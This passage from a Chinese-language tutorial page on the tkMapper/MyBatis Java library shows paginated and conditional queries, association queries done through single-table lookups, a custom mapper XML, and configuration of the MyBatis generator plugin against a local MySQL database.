punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Category</span><span class="token punctuation">&gt;</span></span> categories <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectByRowBounds</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Category</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> rowBounds<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Category</span> category<span class="token operator">:</span> categories<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//查询总记录数</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectCount</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Category</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelect5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//带条件分页</span>        <span class="token comment">//条件</span>        <span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">Category</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"categoryLevel"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//分页</span>        <span class="token keyword">int</span> pageNum <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pageSize <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token punctuation">(</span>pageNum<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span>pageSize<span class="token punctuation">;</span>        <span class="token class-name">RowBounds</span> rowBounds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RowBounds</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>pageSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Category</span><span class="token punctuation">&gt;</span></span> categories <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectByExampleAndRowBounds</span><span class="token punctuation">(</span>example<span class="token punctuation">,</span>rowBounds<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Category</span> category<span class="token operator">:</span> categories<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment">//查询总记录数（满足条件）</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> categoryDAO<span class="token punctuation">.</span><span class="token function">selectCountByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、在使用tkMapper是如何进行关联查询"><a href="#六、在使用tkMapper是如何进行关联查询" class="headerlink" title="六、在使用tkMapper是如何进行关联查询"></a>六、在使用tkMapper是如何进行关联查询</h2><h4 id="6-1-所有的关联查询都可以通过多个单表操作实现"><a href="#6-1-所有的关联查询都可以通过多个单表操作实现" class="headerlink" title="6.1 所有的关联查询都可以通过多个单表操作实现"></a>6.1 所有的关联查询都可以通过多个单表操作实现</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//查询用户同时查询订单</span><span class="token class-name">Example</span> example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>criteria<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"zhangsan"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//根据用户名查询用户</span><span class="token comment">//1.先根据用户名查询用户信息</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> users <span class="token operator">=</span> userDAO<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">User</span> user <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2.再根据用户id到订单表查询订单</span><span class="token class-name">Example</span> example1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token class-name">Orders</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Example</span><span class="token punctuation">.</span><span class="token class-name">Criteria</span> criteria1 <span class="token operator">=</span> example1<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>criteria1<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"userId"</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getUserId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Orders</span><span class="token punctuation">&gt;</span></span> ordersList <span class="token operator">=</span> orderDAO<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3.将查询到订单集合设置到user</span>user<span class="token punctuation">.</span><span class="token function">setOrdersList</span><span class="token punctuation">(</span>ordersList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-2-自定义连接查询"><a href="#6-2-自定义连接查询" class="headerlink" title="6.2 自定义连接查询"></a>6.2 自定义连接查询</h4><ul><li>在使用tkMapper,DAO继承Mapper和MySqlMapper之后，还可以自定义查询</li></ul><h6 id="6-2-1-在DAO接口自定义方法"><a href="#6-2-1-在DAO接口自定义方法" class="headerlink" title="6.2.1 在DAO接口自定义方法"></a>6.2.1 在DAO接口自定义方法</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDAO</span> <span class="token keyword">extends</span> <span class="token class-name">GeneralDAO</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">selectByUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="6-2-2-创建Mapper文件"><a href="#6-2-2-创建Mapper文件" class="headerlink" title="6.2.2 创建Mapper文件"></a>6.2.2 创建Mapper文件</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.fmmall.dao.UserDAO<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>insertUser<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        insert into users(username,password,user_img,user_regtime,user_modtime)        values(#{username},#{password},#{userImg},#{userRegtime},#{userModtime})    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>User<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_id<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userId<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>realname<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>realname<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_img<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userImg<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_mobile<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMobile<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_email<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userEmail<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_sex<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userSex<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_birth<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userBirth<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_regtime<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userRegtime<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user_modtime<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userModtime<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>queryUserByName<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        select            user_id,            username,            password,            nickname,            realname,            user_img,            user_mobile,            user_email,            user_sex,            user_birth,            user_regtime,            user_modtime        from users        where username=#{name}    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、逆向工程"><a href="#七、逆向工程" class="headerlink" title="七、逆向工程"></a>七、逆向工程</h2><blockquote><p>逆向工程，根据创建好的数据表，生成实体类、DAO、映射文件</p></blockquote><h4 id="7-1-添加逆向工程依赖"><a href="#7-1-添加逆向工程依赖" class="headerlink" title="7.1 添加逆向工程依赖"></a>7.1 添加逆向工程依赖</h4><blockquote><p>是依赖是一个mybatis的maven插件</p></blockquote><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.mybatis.generator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mybatis-generator-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.3.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>5.1.47<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>tk.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mapper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.4.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-2-逆向工程配置"><a href="#7-2-逆向工程配置" class="headerlink" title="7.2 逆向工程配置"></a>7.2 逆向工程配置</h4><ul><li>在resources/generator目录下创建generatorConfig.xml</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">generatorConfiguration</span>        <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span>        <span class="token string">"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>generatorConfiguration</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入数据库连接配置 --&gt;</span><span class="token comment">&lt;!--    &lt;properties resource="jdbc.properties"/&gt;--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mysql<span class="token punctuation">"</span></span> <span class="token attr-name">targetRuntime</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MyBatis3Simple<span class="token punctuation">"</span></span> <span class="token attr-name">defaultModelType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flat<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>beginningDelimiter<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>`<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>endingDelimiter<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>`<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token comment">&lt;!-- 配置 GeneralDAO --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tk.mybatis.mapper.generator.MapperPlugin<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mappers<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.tkmapperdemo.general.GeneralDAO<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 配置数据库连接 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jdbcConnection</span> <span class="token attr-name">driverClass</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span>                <span class="token attr-name">connectionURL</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql://localhost:3306/fmmall2<span class="token punctuation">"</span></span>                <span class="token attr-name">userId</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span> <span class="token attr-name">password</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin123<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jdbcConnection</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- 配置实体类存放路径 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>javaModelGenerator</span> <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.tkmapperdemo.beans<span class="token punctuation">"</span></span> <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src/main/java<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token comment">&lt;!-- 配置 XML 存放路径 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sqlMapGenerator</span> <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src/main/resources/mappers<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token comment">&lt;!-- 配置 DAO 存放路径 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>javaClientGenerator</span> <span class="token attr-name">targetPackage</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.tkmapperdemo.dao<span class="token punctuation">"</span></span> <span class="token attr-name">targetProject</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src/main/java<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XMLMAPPER<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token comment">&lt;!-- 配置需要指定生成的数据库和表，% 代表所有表 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">tableName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!-- mysql 配置 --&gt;</span><span class="token comment">&lt;!--            &lt;generatedKey column="id" sqlStatement="Mysql" identity="true"/&gt;--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--        &lt;table tableName="tb_roles"&gt;--&gt;</span><span class="token comment">&lt;!--            &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span><span class="token comment">&lt;!--            &lt;generatedKey column="roleid" sqlStatement="Mysql" identity="true"/&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;/table&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;table tableName="tb_permissions"&gt;--&gt;</span><span class="token comment">&lt;!--            &amp;lt;!&amp;ndash; mysql 配置 &amp;ndash;&amp;gt;--&gt;</span><span class="token comment">&lt;!--            &lt;generatedKey column="perid" sqlStatement="Mysql" identity="true"/&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;/table&gt;--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>generatorConfiguration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" 